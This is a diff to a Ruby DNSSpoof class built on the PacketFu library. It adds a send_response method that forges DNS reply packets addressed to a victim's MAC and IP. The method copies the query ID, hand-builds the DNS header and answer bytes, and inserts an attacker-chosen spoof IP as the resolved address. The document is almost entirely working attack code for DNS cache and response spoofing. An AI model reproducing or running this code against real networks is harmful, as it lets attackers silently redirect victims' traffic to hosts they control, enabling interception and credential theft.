@@ -59,4 +59,45 @@ class DNSSpoof
                 end
             end
         end
+        
+
+        def send_response
+            udp_packet = PacketFu::UDPPacket.new(:config => @cfg)
+            
+            udp_packet.udp_src   = @packet.udp_dst
+            udp_packet.udp_dst   = @packet.udp_src
+            udp_packet.eth_daddr = @victim_mac
+            udp_packet.ip_daddr  = @victim_ip
+            udp_packet.ip_saddr  = @packet.ip_daddr
+    #        udp_packet.payload   = @packet.payload[0, 2].force_encoding("ASCII-8BIT")
+            udp_packet.payload   = @packet.payload[0, 2]
+            
+    #        udp_packet.payload += "\x81\x80".force_encoding("ASCII-8BIT") + "\x00\x01".force_encoding("ASCII-8BIT") + "\x00\x01".force_encoding("ASCII-8BIT")
+    #        udp_packet.payload += "\x00\x00".force_encoding("ASCII-8BIT") + "\x00\x00".force_encoding("ASCII-8BIT")
+    
+            udp_packet.payload += "\x81\x80" + "\x00\x01" + "\x00\x01"
+            udp_packet.payload += "\x00\x00" + "\x00\x00"
+            
+            @domain_name.split('.').each do |part|
+                udp_packet.payload += part.length.chr
+                udp_packet.payload += part
+            end # @domain_name.split('.').each do |part|
+    
+    #        udp_packet.payload += "\x00\x00\x01\x00".force_encoding("ASCII-8BIT") + "\x01\xc0\x0c\x00".force_encoding("ASCII-8BIT")
+    #        udp_packet.payload += "\x01\x00\x01\x00".force_encoding("ASCII-8BIT") + "\x00\x1b\xf9\x00".force_encoding("ASCII-8BIT") + "\x04".force_encoding("ASCII-8BIT")
+    
+            udp_packet.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
+            udp_packet.payload += "\x01\x00\x01\x00" + "\x00\x1b\xf9\x00" + "\x04"
+    
+            
+            # Address
+            spoof_ip = @spoof_ip.split('.')
+    #        udp_packet.payload += [spoof_ip[0].to_i, spoof_ip[1].to_i, spoof_ip[2].to_i, spoof_ip[3].to_i].pack('c*').force_encoding("ASCII-8BIT")
+            udp_packet.payload += [spoof_ip[0].to_i, spoof_ip[1].to_i, spoof_ip[2].to_i, spoof_ip[3].to_i].pack('c*')
+            
+            udp_packet.recalc
+             
+        send(udp_packet, @iface)   
+        end # send_response
+    end
 
